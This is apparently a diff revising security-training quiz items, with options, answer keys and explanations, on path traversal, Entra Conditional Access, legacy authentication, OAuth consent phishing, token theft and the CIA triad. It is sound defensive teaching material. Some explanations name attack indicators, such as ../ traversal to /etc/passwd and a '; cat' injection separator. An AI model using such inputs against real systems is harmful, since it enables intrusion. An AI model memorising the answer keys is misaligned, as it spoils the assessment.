-            "label": "A07 Authentication Failures, because reading /etc/passwd lets the attacker log in with those passwords directly.",
+            "label": "A01 IDOR: hunt for one session requesting many sequential file names that it never uploaded itself.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The ../ sequence climbs out of the intended directory to read an arbitrary file, which is path traversal (CWE-22), one of the four shapes of A01 Broken Access Control. Hunt for ../ and its URL-encodings in file/path/page parameters. The Security Misconfiguration option is wrong because this is a traversal in a parameter, not directory listing. The SSRF option is wrong because SSRF is the server fetching an attacker-chosen URL, not reading a local file via a path. The Authentication Failures option is wrong because modern /etc/passwd stores no usable password hashes and reading it is not a login."
+        "explanation": "The ../ sequence climbs out of the intended download folder to read an arbitrary file, which is path traversal (CWE-22), one of the four shapes of A01 Broken Access Control; the hunt is for ../ and its URL encodings in file, path or page parameters. \"A03 OS command injection\" is wrong: command injection shows a shell separator and a command (such as ; cat) in a parameter, and this request contains only a relative path. \"A01 forced browsing\" is wrong: forced browsing requests a hidden URL directly, not a parameter that walks up the directory tree. \"A01 IDOR\" is wrong: IDOR changes an object ID to reach another user's record, while this request escapes the folder to reach a system file."
       }
     ],
     "references": [
@@ -3475,165 +3475,165 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "In the Entra sign-in logs you find a successful authentication to Exchange where the client app is a legacy protocol (IMAP), the user completed only single-factor authentication, and Conditional Access shows as not applied. Why is this concerning?",
+        "question": "In the Entra sign-in logs you find a successful authentication to Exchange Online where ClientAppUsed is IMAP4, the authentication requirement is single-factor, and ConditionalAccessStatus is notApplied. The tenant has a policy requiring MFA for all users. What is the most accurate reading of this entry?",
         "options": [
           {
-            "label": "Legacy protocols like IMAP cannot honour MFA grant controls, so the attacker bypassed the MFA requirement.",
+            "label": "IMAP4 cannot do MFA, and no policy covering that client app was in scope, so the password alone was enough.",
             "value": "a"
           },
           {
-            "label": "The sign-in used a compliant device, which always guarantees the account is safe from compromise.",
+            "label": "The sign-in-risk policy failed, because a risky IMAP4 login should have been stepped up to MFA automatically.",
             "value": "b"
           },
           {
-            "label": "IMAP sign-ins are automatically blocked by Entra, so this log entry must be a false record.",
+            "label": "notApplied means the MFA policy evaluated the sign-in and decided the location was trusted enough to skip MFA.",
             "value": "c"
           },
           {
-            "label": "Single-factor authentication over IMAP still triggers the same risk scoring as modern auth flows.",
+            "label": "Low concern: IMAP4 is a header-sync protocol, so it cannot reach mailbox content the way a browser can.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Legacy authentication protocols such as IMAP predate modern auth and cannot perform MFA or honour Conditional Access grant controls, so a successful legacy sign-in with only single factor means the MFA requirement was bypassed. The compliant-device option is wrong and misleading; the entry does not indicate a compliant device and compliance never guarantees safety. The claim that IMAP sign-ins are auto-blocked is false because Entra does not auto-block legacy auth unless a policy is configured to do so. The claim that IMAP triggers the same risk scoring overstates legacy auth's risk visibility, which is precisely why blocking it is recommended."
+        "explanation": "The key is correct: legacy clients such as IMAP4 cannot perform an interactive MFA challenge, and notApplied shows that no enabled policy covered this client app and user, so a password alone succeeded — a real gap. The sign-in-risk option misses the core problem: even if a risk policy fired, it would demand MFA, which an IMAP4 client cannot complete; only Block is effective. The “trusted location” reading misreads the field: a policy that evaluated the sign-in and was satisfied would show success, not notApplied. The “header-sync protocol” option is false — IMAP4 retrieves full mailbox content, which is why legacy access to Exchange matters."
       },
       {
         "question": "How does a risk-based Conditional Access sign-in policy typically respond when Identity Protection scores a sign-in as medium or high risk, assuming the user has MFA registered?",
         "options": [
           {
-            "label": "It silently allows the sign-in and only records the risk level for later manual review by an analyst.",
+            "label": "It allows the sign-in and records the risk so an analyst can review it later in the risky sign-ins report.",
             "value": "a"
           },
           {
-            "label": "It permanently disables the user account and requires an administrator to manually re-enable it.",
+            "label": "It requires a secure password change after sign-in, which also revokes the user’s existing sessions.",
             "value": "b"
           },
           {
-            "label": "It requires MFA in the moment, and a successful challenge can automatically remediate the sign-in risk.",
+            "label": "It requires MFA in the moment, and a successful challenge can self-remediate the sign-in risk.",
             "value": "c"
           },
           {
-            "label": "It reroutes the sign-in to a legacy authentication endpoint so the user can bypass the challenge.",
+            "label": "It blocks the sign-in until an administrator dismisses the risk in Identity Protection.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "A sign-in-risk policy typically requires MFA when risk is medium or high; if the user successfully completes MFA, the risk can be automatically remediated and access granted, raising friction only when needed. Silently allowing and only logging is wrong because the whole point is to act in the moment, not just log. Permanently disabling the account is too extreme and describes neither the sign-in-risk nor user-risk policy behaviour. Rerouting to a legacy authentication endpoint is nonsensical and dangerous, as legacy endpoints are what such policies aim to eliminate."
+        "explanation": "A sign-in-risk policy typically requires MFA when risk is medium or high; if the user completes MFA, the sign-in risk can be remediated automatically and access granted, so friction appears only when needed. Allowing and only recording the risk is what happens when no risk policy is enforced (or a policy is report-only), not the policy’s typical action. Requiring a secure password change is the user-risk policy’s response to a likely compromised account, not the sign-in-risk policy’s response to a single risky event. Blocking until an administrator dismisses the risk is possible to configure but is not the typical design, which lets a legitimate user prove themselves with MFA."
       },
       {
         "question": "A hunting query over SigninLogs filters to ClientAppUsed in ('IMAP4', 'POP3', 'Authenticated SMTP') and ResultType == 0, and returns dozens of successful sign-ins with ConditionalAccessStatus = 'notApplied'. What is the most appropriate remediation, based on what these results indicate?",
         "options": [
           {
-            "label": "Add all affected users and applications to the block-legacy-authentication Conditional Access policy, then re-run the query to confirm zero results.",
+            "label": "Extend a block-legacy-authentication policy to these users and client apps, then re-run the hunt to confirm zero.",
             "value": "a"
           },
           {
-            "label": "Delete the SigninLogs table entries so the finding no longer appears in future audits of the tenant.",
+            "label": "Add the affected users to the sign-in-risk policy so that MFA is required whenever their sign-in risk is elevated.",
             "value": "b"
           },
           {
-            "label": "Increase the sign-in risk threshold required to trigger MFA, since legacy protocols already imply lower risk.",
+            "label": "Create an analytics rule that alerts on each new legacy sign-in, and leave the existing policies as they are.",
             "value": "c"
           },
           {
-            "label": "Disable Identity Protection entirely, since it clearly failed to evaluate these legacy sign-ins in the first place.",
+            "label": "Force a password reset for every affected user so that any exposed legacy-protocol passwords stop working.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The results prove legacy authentication is still active and bypassing Conditional Access entirely, so the fix is closing that actual gap by blocking legacy auth for the affected scope, then confirming with the same query that the count drops to zero. Deleting the SigninLogs entries hides evidence without fixing anything and is inappropriate practice. Raising the sign-in risk threshold for MFA is backwards; legacy protocols should be treated with more scrutiny, not less. Disabling Identity Protection misdiagnoses the issue: Identity Protection did not fail, Conditional Access simply cannot evaluate protocols that do not support modern authentication claims."
+        "explanation": "The results show legacy authentication still succeeding with no policy in scope, so the fix is closing that gap — a policy that blocks legacy authentication for the affected users and client apps — and then re-running the same hunt to confirm the count drops to zero. Adding the users to the sign-in-risk policy fails because its control is MFA, which IMAP4, POP3 and Authenticated SMTP clients cannot complete. An analytics rule only detects the gap again next time; the lesson’s point is to close the policy gap rather than only tune detections. A password reset deals with possibly exposed credentials, but the next stolen password would work over the same open protocol."
       },
       {
-        "question": "An administrator wants a stolen session token for an admin portal to become unusable within minutes of a forced password reset, even though the token has not technically expired yet. Which Conditional Access session control is specifically designed to achieve this?",
+        "question": "An administrator wants a stolen session token for an admin portal to become unusable within minutes of a forced password reset, even though the token has not technically expired yet. Which session control or capability is designed to achieve this?",
         "options": [
           {
-            "label": "Continuous Access Evaluation, which lets supporting services react to critical events like a password reset near-instantly rather than waiting for the token's normal expiry.",
+            "label": "Continuous Access Evaluation, which lets supporting services act on a password reset before token expiry.",
             "value": "a"
           },
           {
-            "label": "App-enforced restrictions, which pass device compliance state to Exchange Online and SharePoint Online only, and to no other applications at all.",
+            "label": "Sign-in frequency set to every 4 hours, which forces reauthentication on a fixed schedule for the portal.",
             "value": "b"
           },
           {
-            "label": "Persistent browser session, which merely determines whether closing and reopening the browser window keeps the user signed in.",
+            "label": "Disabling persistent browser session, so that closing the browser ends the user’s signed-in session.",
             "value": "c"
           },
           {
-            "label": "Sign-in frequency left at its unconfigured default, which is a rolling 90-day window before reauthentication is ever required again.",
+            "label": "App-enforced restrictions, which pass the device’s compliance state to the application being accessed.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Continuous Access Evaluation is designed precisely to react to critical events like a password reset near-instantly, invalidating a token before its normal expiry. App-enforced restrictions only applies to two specific apps and does not revoke tokens. Persistent browser session concerns browser reopening behaviour, not forced revocation. A 90-day default sign-in frequency is the opposite of fast revocation."
+        "explanation": "Continuous Access Evaluation lets supporting services react to critical events such as a password reset, a disabled user or a revoked session near-instantly, invalidating a token before its normal expiry. A 4-hour sign-in frequency gives a stolen token a hard expiry, but the token stays usable until that window ends, not within minutes of the reset. Disabling persistent browser session only ends the session when the browser holding it is closed — the attacker controls the browser that replays the stolen token. App-enforced restrictions pass device state to specific apps and do not revoke tokens."
       },
       {
-        "question": "A Conditional Access policy's state field is set to enabledForReportingButNotEnforced. What actually happens during a real sign-in under this configuration?",
+        "question": "A Conditional Access policy’s state field is set to enabledForReportingButNotEnforced. What actually happens during a real sign-in under this configuration?",
         "options": [
           {
-            "label": "Entra ID evaluates the policy's conditions and records what decision it would have made, without enforcing that decision on the sign-in.",
+            "label": "Entra ID evaluates the policy and logs the decision it would have made, without enforcing it.",
             "value": "a"
           },
           {
-            "label": "Entra ID enforces the policy exactly as if state were set to enabled, but simply hides the enforcement from administrators.",
+            "label": "Entra ID enforces the policy but writes its decisions to the insights workbook instead of the sign-in log.",
             "value": "b"
           },
           {
-            "label": "Entra ID skips evaluating the policy entirely, an effect identical to setting state to disabled.",
+            "label": "Entra ID skips the policy entirely, exactly as it would if the state were set to disabled.",
             "value": "c"
           },
           {
-            "label": "Entra ID requires the reviewing administrator to manually approve every sign-in the policy would have blocked.",
+            "label": "Entra ID enforces the policy for administrators first and records the results for all other users.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "enabledForReportingButNotEnforced evaluates the policy's conditions and logs the would-be decision without applying it. The claim that it enforces but hides enforcement is wrong; no enforcement actually occurs in report-only mode. The claim that it skips evaluation like disabled is wrong; disabled skips evaluation entirely, while report-only still evaluates conditions, it just does not enforce the resulting control. The claim that an administrator must approve each sign-in invents a manual-approval workflow that does not exist."
+        "explanation": "enabledForReportingButNotEnforced evaluates the policy’s conditions against each real sign-in and records the would-be result without applying it, which is why it is the safe way to test a policy. The option that enforces and reports to the workbook instead of the sign-in log is wrong: nothing is enforced in report-only mode, and the workbook simply aggregates the logged results. The “same as disabled” option is wrong because a disabled policy is not evaluated at all, while report-only still evaluates and logs. Enforcing for administrators first describes a staged rollout the administrator would build with assignments, not what the report-only state does."
       },
       {
         "question": "A user is in scope of two enabled Conditional Access policies at once: one grants access if MFA is satisfied, the other specifies Block access. What is the outcome, and why?",
         "options": [
           {
-            "label": "Access is blocked: when any applicable policy specifies Block access, it overrides the grant controls of every other applicable policy.",
+            "label": "Access is blocked, because Block in any applicable policy overrides every other policy’s grant.",
             "value": "a"
           },
           {
-            "label": "Access is granted once MFA is completed, because a grant control such as Require MFA always takes precedence over a Block access control.",
+            "label": "Access is granted after MFA, because a grant control is more specific than Block and is applied first.",
             "value": "b"
           },
           {
-            "label": "The two policies cancel each other out, so the sign-in falls back to ordinary password-only access with no additional controls applied.",
+            "label": "The user is prompted for MFA, and the Block policy takes effect if that MFA challenge fails.",
             "value": "c"
           },
           {
-            "label": "Entra applies whichever of the two policies was created earlier and silently ignores the other policy entirely for this sign-in.",
+            "label": "Entra applies whichever of the two policies was created or last modified most recently.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Conditional Access policies are additive and all applicable ones must be satisfied, and Block access always wins over any grant, so the user is blocked. The 'MFA grant takes precedence' option is wrong because a grant never overrides a block. The 'policies cancel out' option is wrong because an unmet or blocking policy still applies. The 'earlier policy wins' option is wrong because Entra does not choose by creation order; every in-scope policy is evaluated together."
+        "explanation": "All applicable Conditional Access policies must be satisfied, and Block always wins, so the user is blocked. The “grant is more specific” option is wrong because Entra has no specificity ordering — a grant never overrides a block. The “block only if MFA fails” option invents a fallback order; the two policies are evaluated together and Block cannot be satisfied by any proof. The “most recent policy wins” option is wrong because creation or modification order plays no part — every in-scope policy applies."
       },
       {
-        "question": "Why can a successful sign-in over a legacy protocol such as IMAP4 or POP3 bypass a Conditional Access policy that requires MFA?",
+        "question": "Ten minutes after a user clicked a phishing link that led to a convincing Microsoft sign-in page, the sign-in log shows the same account opening Exchange Online from a new IP in another country. ClientAppUsed is Browser, there are no failed sign-ins beforehand, no new MFA prompt was recorded although policy requires MFA, and Identity Protection raised a token-anomaly detection. What is the most likely technique and the right first containment step?",
         "options": [
           {
-            "label": "Legacy/basic-auth clients cannot complete an MFA challenge, so if no policy covering those client apps is in scope the sign-in shows notApplied and the password alone succeeds; the fix is a policy that blocks legacy authentication.",
+            "label": "Token theft and replay (T1550): revoke the user’s sessions and refresh tokens, then reset the password.",
             "value": "a"
           },
           {
-            "label": "IMAP4 and POP3 encrypt the password so strongly that Conditional Access cannot read it, so it defaults to allowing the sign-in through without any challenge.",
+            "label": "MFA fatigue: the user approved an attacker’s push prompt, so reset the user’s registered MFA methods.",
             "value": "b"
           },
           {
-            "label": "Conditional Access deliberately exempts all email protocols so that mail delivery keeps flowing uninterrupted during an authentication service outage.",
+            "label": "Legacy authentication bypass: extend the block-legacy-authentication policy to include this user.",
             "value": "c"
           },
           {
-            "label": "These protocols require a compliant, Intune-enrolled device by default, and that requirement automatically satisfies every configured grant control.",
+            "label": "Password spray: the password was guessed, so enable account lockout and require a password change.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Legacy/basic-authentication clients predate modern auth and cannot perform an interactive MFA challenge. Conditional Access can still evaluate them — the Client apps condition ('Exchange ActiveSync clients', 'Other clients') exists for exactly this — but a Require MFA control can never be satisfied over them, so the only effective control is Block. When the log shows conditionalAccessStatus notApplied, no enabled policy covered that client app and user, and the password alone was enough. That is why the standard hardening step is a policy that blocks legacy authentication outright. The 'password encrypted too strongly' option is wrong because encryption is unrelated. No intentional email-protocol exemption exists in Conditional Access. Legacy protocols do not require a compliant device and pass no device state at all."
+        "explanation": "The evidence fits token theft and replay: a phishing page that captures the post-MFA session token lets the attacker reuse it from another IP without a new MFA prompt, and Identity Protection flags token anomalies for exactly this. The response the lesson gives is to revoke sessions and refresh tokens and force a secure password reset (then check for attacker-added MFA methods). MFA fatigue would show repeated MFA prompts that the user finally approved, but no prompt was recorded here. Legacy authentication does not fit because ClientAppUsed is Browser, a modern client. Password spray would show failed attempts first, and there are none."
       }
     ],
     "references": [
@@ -3710,119 +3710,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A user reports clicking Accept on a Microsoft permission screen for an app called 'Mail Sync Helper' after receiving an email link. You confirm the app was granted offline_access and Mail.Read. The user then changed their password. Why is the password change alone insufficient to stop the attacker?",
+        "question": "A user reports clicking Accept on a Microsoft permission screen for an app called “Mail Sync Helper” after receiving an email link. You confirm the app was granted offline_access and Mail.Read. The user then changed their password. Why is the password change alone insufficient to stop the attacker?",
         "options": [
           {
-            "label": "The password change failed to propagate because the account still had an active MFA session token.",
+            "label": "The user’s existing browser sessions were not revoked, so the attacker can keep using that signed-in session.",
             "value": "a"
           },
           {
-            "label": "The attacker holds a refresh token from the consented app, so mailbox access continues despite the reset.",
+            "label": "The attacker holds a refresh token issued to the consented app, so mailbox access survives the reset.",
             "value": "b"
           },
           {
-            "label": "Password changes never affect email access because mailboxes use a separate credential system entirely.",
+            "label": "The attacker registered an MFA method during the phishing, so they can sign in again with the new password.",
             "value": "c"
           },
           {
-            "label": "The app will simply request the password again automatically the next time it needs to read mail.",
+            "label": "The attacker captured the password on the consent page, and the reset takes time to replicate to Exchange.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "In consent phishing the attacker never had the password; they hold a refresh token granted to the consented app, so resetting the password does not revoke that delegated access, and mailbox reads continue. Proper response is to revoke the app consent and the refresh tokens. The 'active MFA session token' option invents a propagation failure that is not the mechanism. The 'separate credential system' option is false; mailboxes do use the account credential, but that is beside the point since no password is involved in the grant. The 'app will request the password again' option misunderstands OAuth, where the app uses tokens, not the password."
+        "explanation": "In consent phishing the attacker never needs the password: the consented app holds a refresh token (offline_access) for delegated access, and a password reset does not revoke that grant, so mailbox reads continue until the consent and the refresh tokens are revoked. The browser-session option names a real hygiene step, but the attacker is not using the user’s browser session — they use the app’s own tokens. The MFA-method option describes a credential-phishing takeover; here the user consented on the genuine Microsoft page and the attacker never signs in as the user. The captured-password option repeats the same misconception: the consent screen is Microsoft’s real page, the password never goes to the attacker, and replication delay is not the mechanism."
       },
       {
         "question": "Which preventive control most directly stops OAuth consent phishing from succeeding in an Entra ID tenant?",
         "options": [
           {
-            "label": "Requiring users to change their passwords more frequently and enforcing longer minimum password length.",
+            "label": "Requiring MFA for every sign-in through Conditional Access, so a phished login cannot be reused later.",
             "value": "a"
           },
           {
-            "label": "Blocking all inbound email attachments so phishing lures can never reach end users at all.",
+            "label": "Turning on Safe Links URL rewriting, so the link in the lure is checked before the user opens it.",
             "value": "b"
           },
           {
-            "label": "Restricting user consent so users cannot freely grant third-party apps, routing requests to admin review.",
+            "label": "Restricting user consent, so users cannot freely grant third-party apps and requests go to admin review.",
             "value": "c"
           },
           {
-            "label": "Enabling impossible-travel detection so distant sign-ins from the malicious app are always flagged.",
+            "label": "A sign-in-risk policy that requires MFA whenever Identity Protection rates a sign-in as risky.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "Restricting user consent removes the click that makes the attack work: if users cannot freely grant third-party apps and instead requests go through an admin consent workflow, a human reviews the app and scopes before any grant is issued. The password-policy option addresses credentials, which are irrelevant since no password is stolen. Blocking all email attachments is impractical and misses the point, since the lure links to a real consent URL, not an attachment. Impossible-travel detection does not help because consent phishing produces no anomalous sign-in for the user; the app's token use blends into normal API traffic."
+        "explanation": "Restricting user consent removes the click the attack depends on: users can no longer grant third-party apps freely, and requests go through an admin consent workflow where a human reviews the app and scopes first. Requiring MFA does not help because the victim completes MFA on the real provider before consenting, and the attacker’s token represents that already-MFA’d session. Safe Links does not stop it either: the lure points to a genuine Microsoft consent URL, and a trustworthy domain proves only that the mechanism is real, not that the app is. A sign-in-risk policy misses it because consent phishing produces no anomalous sign-in for the user — the app’s token use blends into normal API traffic."
       },
       {
-        "question": "In the Entra audit log event for a consent grant, targetResources[0].modifiedProperties contains a newValue of 'Mail.Read offline_access Files.Read.All' for an app named 'Mail Sync Helper' that no one on the security team recognises. What should this specific combination of fields most directly prompt the analyst to do?",
+        "question": "The Entra audit log shows a “Consent to application” event initiated by d.cohen@contoso.com for an app named “Mail Sync Helper” that no one on the security team recognises. The ConsentAction.Permissions property reads “Mail.Read offline_access Files.Read.All”. What should the analyst do first?",
         "options": [
           {
-            "label": "Ignore it, since 'Consent to application' events are purely informational and never indicate risk on their own.",
+            "label": "Close it as benign, because d.cohen completed MFA before consenting and the event result is success.",
             "value": "a"
           },
           {
-            "label": "Treat the sensitive, durable scopes granted to an unrecognised app as a high-priority lead and investigate the app and grantee.",
+            "label": "Treat it as a priority lead: check the app’s publisher, redirect domain and how many users consented.",
             "value": "b"
           },
           {
-            "label": "Reset the consenting user's password immediately, since that alone fully revokes the app's access to the mailbox.",
+            "label": "Block the sender’s email domain, since stopping further lures removes the risk created by this grant.",
             "value": "c"
           },
           {
-            "label": "Wait for a sign-in risk alert on the same user before taking any action on the consent event.",
+            "label": "Wait for a risky OAuth app alert from Defender for Cloud Apps, which confirms the app automatically.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "An unrecognised app being granted offline_access plus mailbox and file read scopes is exactly the high-value, durable combination attackers request, so it should be treated as a priority lead for investigation. Ignoring it wrongly dismisses a meaningful audit event. Resetting the user's password repeats the earlier lesson's key mistake: a password reset does not revoke a refresh token tied to app consent. Waiting for a sign-in risk alert is backwards, since consent phishing typically produces no sign-in risk alert at all, which is precisely why the consent event itself must be the trigger."
+        "explanation": "Durable, sensitive scopes (offline_access with mail and file read) granted to an unrecognised app are exactly the combination attackers request, so this is a priority lead: check the signals the lesson lists — unverified publisher, unfamiliar redirect domain, low prevalence, and other users consenting to the same app — and then respond. A successful result and a completed MFA prove only that the grant was issued; consent phishing works through a genuine, MFA-protected flow. Blocking the sender may stop new lures, but the grant already issued keeps working. Waiting for a Defender for Cloud Apps alert is backwards: the lesson treats those detections as leads to confirm in the audit log, and this audit event is already the ground truth."
       },
       {
         "question": "An unrecognised app was granted Mail.Read as a DELEGATED permission by a single ordinary employee who clicked Accept on a phishing lure. A separate app was later granted Mail.Read as an APPLICATION permission after an administrator approved a tenant-wide admin consent request. How do the blast radii of these two grants differ?",
         "options": [
           {
-            "label": "They are identical, since Mail.Read always grants access to only the one account that appears in the consent event regardless of permission type.",
+            "label": "Both reach one mailbox, since Mail.Read covers the account named in the consent event, whatever the type.",
             "value": "a"
           },
           {
-            "label": "The delegated grant exposes only the consenting employee's own mailbox, while the application permission exposes every mailbox in the entire tenant, since the app then acts as itself with no signed-in user.",
+            "label": "The delegated grant reaches the employee’s own mailbox; the application permission reaches every mailbox.",
             "value": "b"
           },
           {
-            "label": "The application permission is actually less dangerous, because it always requires admin consent and is therefore reviewed automatically by security software before taking effect.",
+            "label": "The application permission is safer, since admin consent means the app was reviewed before it took effect.",
             "value": "c"
           },
           {
-            "label": "Delegated permissions can only ever be granted to read calendar data, never mailbox content, regardless of the scope name shown in the consent screen.",
+            "label": "The delegated grant is broader, since it carries the employee’s refresh token and the application grant does not.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Delegated permissions bound the app to the intersection of its grant and the specific signed-in user's own access — one mailbox. Application permissions let the app act as itself with no user present, so the identical scope name (Mail.Read) reaches every mailbox in the tenant. The 'they are identical' option ignores this fundamental difference. The 'application permission is less dangerous' option wrongly assumes admin consent equals automated technical review; a human administrator can still be tricked. The calendar-only option invents a restriction that does not exist — the scope name and its reach are exactly what this section describes."
+        "explanation": "A delegated permission limits the app to what the signed-in user can access — here one mailbox — while an application permission lets the app act as itself with no user present, so the same scope name reaches every mailbox in the tenant. Treating both as one mailbox ignores that difference in permission type. Calling the application permission safer confuses admin approval with security review: a human administrator can be tricked, and a tenant-wide grant is exactly why it is dangerous. The refresh-token option is backwards: refresh tokens keep a delegated grant alive, but they do not make it reach more data than an application permission that needs no user at all."
       },
       {
-        "question": "During triage you see an 'Add app role assignment to service principal' audit event granting the Office 365 Exchange Online full_access_as_app role to an app no one recognises. Compared with a single-user delegated Mail.Read grant, why does this demand a far more urgent response?",
+        "question": "Two “Consent to application” events refer to the same unfamiliar app. Event 1 has ConsentType Principal and was initiated by d.cohen. Event 2 has ConsentType AllPrincipals, with ConsentContext.IsAdminConsent and OnBehalfOfAll both True, and was initiated by an IT administrator. What does event 2 mean?",
         "options": [
           {
-            "label": "full_access_as_app is an application permission, so the app reads every mailbox in the tenant, not just one user’s.",
+            "label": "An admin consented to the app’s delegated scopes for all users, so it can act for any user who signs in.",
             "value": "a"
           },
           {
-            "label": "An app role assignment silently expires within an hour unless it is renewed by the user.",
+            "label": "The app now holds application permissions, so it can read every mailbox with no user signed in at all.",
             "value": "b"
           },
           {
-            "label": "Application permissions are lower risk because an administrator already reviewed them, so no action is needed.",
+            "label": "The grant covers the administrator who approved it, since AllPrincipals names the account that gave consent.",
             "value": "c"
           },
           {
-            "label": "The event only affects the single administrator who happened to approve it, limiting the blast radius.",
+            "label": "It duplicates event 1, since both events record delegated access limited to d.cohen’s own mailbox.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "An application permission (app role) like full_access_as_app lets the app act as itself, unattended, across the whole tenant — here reading every mailbox, exactly the blast radius Midnight Blizzard exploited. A delegated Mail.Read grant reaches only the one consenting user’s mailbox. The 'consent expires within an hour' option invents an expiry rule. The claim that application permissions are lower risk is backwards: admin consent for a tenant-wide role is precisely why it is dangerous, not safe. The claim that only the approving administrator is affected misreads an application permission, which reaches every mailbox in the tenant, not the approving admin's alone."
+        "explanation": "In the lesson’s reading of the consent event, Principal means one user consented for themselves, while AllPrincipals (with IsAdminConsent and OnBehalfOfAll True) means an administrator consented to the app’s delegated scopes on behalf of every user — pre-approved access that applies to any user who uses the app. The application-permission option is the misconception the lesson corrects: AllPrincipals is still delegated access, and application permissions are recorded as app-role-assignment events instead. The “covers the approving administrator” option misreads AllPrincipals, which describes who the grant covers, not who clicked. The “duplicate” option ignores that event 2 extends the same delegated scopes beyond d.cohen to the whole tenant."
       }
     ],
     "references": [
@@ -3886,119 +3886,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "An analyst finds that an attacker gained access to a file server and quietly edited several months of application logs to remove traces of their activity, while leaving the data readable and the server online. Which element of the CIA Triad is most directly violated?",
+        "question": "An analyst finds that an attacker gained access to a file server and quietly edited several months of application logs to remove traces of their activity, while leaving the logs readable and the server online. Which security property did the edit itself most directly violate?",
         "options": [
           {
-            "label": "Availability, because editing the logs prevented users from reaching the file server and its services.",
+            "label": "Availability, because the original records the investigators need can no longer be reached as evidence.",
             "value": "a"
           },
           {
-            "label": "Integrity, because the logs were altered by an unauthorized party and can no longer be trusted as accurate.",
+            "label": "Integrity, because the logs were changed by an unauthorized party and can no longer be trusted.",
             "value": "b"
           },
           {
-            "label": "Confidentiality, because the attacker was able to read the sensitive contents of the log files.",
+            "label": "Confidentiality, because the attacker had to read the log contents to know which lines to remove.",
             "value": "c"
           },
           {
-            "label": "Authentication, because the attacker must have stolen a valid password to reach the file server.",
+            "label": "Confidentiality and availability together, because the logs were read and the originals are gone.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct is Integrity: altering data so it no longer reflects reality is the textbook definition of an integrity violation, and tampered logs specifically undermine the trustworthiness of evidence. Availability is wrong because the server stayed online and reachable, so availability was not denied. Confidentiality is wrong because merely reading logs would be confidentiality, but the harm described is modification, not exposure. Authentication names an access mechanism, not a CIA property — authentication is how they got in, not what was ultimately violated."
+        "explanation": "Integrity is correct: the harm described is unauthorized modification, and tampered logs are the lesson's own example of an integrity violation — the remaining log can no longer be trusted as an accurate record. The availability option mistakes a consequence for the property: the server and the log stayed reachable, and what was lost is trust in the content, not access to it. The confidentiality option describes a step the attacker may have taken, but reading is not what the edit violated. The combined confidentiality-and-availability option names two properties that the scenario does not show being attacked and misses the one that was."
       },
       {
         "question": "A standard help-desk user account, which normally only resets passwords, is suddenly seen creating new domain administrator accounts at 3 a.m. Which core security principle is designed to make this activity both limited in damage and easy to flag as suspicious?",
         "options": [
           {
-            "label": "Availability monitoring, which ensures that critical services stay online and reachable for all users.",
+            "label": "Authentication with MFA, which confirms the help-desk user really is who they claim to be.",
             "value": "a"
           },
           {
-            "label": "Defense-in-depth, which layers multiple independent controls so no single failure loses everything.",
+            "label": "Defense-in-depth, which layers several independent controls so one failure does not lose everything.",
             "value": "b"
           },
           {
-            "label": "Least privilege, which grants each account only the access it needs, making extra rights a red flag.",
+            "label": "Least privilege, which gives each account only the rights its job actually requires.",
             "value": "c"
           },
           {
-            "label": "Accounting, which records every login and change so investigators can build a timeline later.",
+            "label": "Accounting, which records each login and change so the timeline can be rebuilt later.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "Correct: least privilege means a help-desk account should never be able to create admins, so both the limited blast radius and the anomaly detection stem from that principle. Defense-in-depth is real and valuable but describes layering controls generally, not why this specific privilege deviation stands out. Accounting is what let you *see* the event, but it does not constrain what the account can do. Availability monitoring is unrelated — nothing here concerns service uptime."
+        "explanation": "Least privilege is correct: a help-desk account that only resets passwords should not hold the right to create domain admins, so the damage it can do is limited, and any attempt to use extra rights stands out as an anomaly. Authentication with MFA proves identity at login, but it places no limit on what an authenticated (or hijacked) account may then do. Defense-in-depth is a valid general strategy of layering controls, but it does not explain why this particular privilege use is out of place. Accounting is what lets you see the event afterwards, but it does not restrict what the account can do."
       },
       {
-        "question": "A company's e-commerce checkout page becomes unreachable for two hours after receiving an enormous volume of requests from thousands of different IP addresses, all hitting the same endpoint. Which CIA Triad property was violated, and what pattern does this match?",
+        "question": "A destructive attack deletes a retailer’s order database and its online backups. The checkout website itself stays up, but staff can no longer look up or fulfil any order. Logs show no outbound data transfer and no unusual reads before the deletion. Which CIA property was primarily violated?",
         "options": [
           {
-            "label": "Confidentiality, because the flood of traffic let the attacker silently read customer payment data during the outage.",
+            "label": "Confidentiality, because an attacker who could delete the database must be assumed to have exposed it.",
             "value": "a"
           },
           {
-            "label": "Availability, because a DDoS flood prevented legitimate customers from reaching the checkout page for two hours.",
+            "label": "Availability, because the business can no longer reach the order data it needs to operate.",
             "value": "b"
           },
           {
-            "label": "Integrity, because the huge number of requests altered the checkout page's stored pricing and product data.",
+            "label": "Integrity, because the order records that remain can no longer be trusted to be accurate.",
             "value": "c"
           },
           {
-            "label": "Authentication, because thousands of IP addresses each had to log in before the page became unreachable.",
+            "label": "Integrity rather than availability, because the checkout website itself stayed online.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct is Availability: an implausible volume of requests from thousands of sources overwhelming one endpoint is the classic DDoS shape, and its effect — legitimate users unable to reach the service — is a direct availability violation. Confidentiality is wrong because nothing here describes data being read. Integrity is wrong because no data alteration was described, only a traffic flood. Authentication is wrong because DDoS traffic does not require authentication, and authentication is not itself a CIA property."
